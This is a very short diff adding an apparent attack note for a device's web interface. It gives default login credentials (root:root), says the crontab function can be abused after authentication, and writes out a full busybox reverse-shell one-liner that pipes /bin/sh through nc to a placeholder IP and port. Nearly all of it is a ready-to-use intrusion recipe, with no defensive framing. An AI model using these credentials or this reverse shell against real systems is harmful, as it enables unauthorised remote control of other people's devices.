@@ -1,0 +1,7 @@
+default password on web interface
+root:root
+
+Crontabs function post auth
+use classic busybox rev shell trick
+
+rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
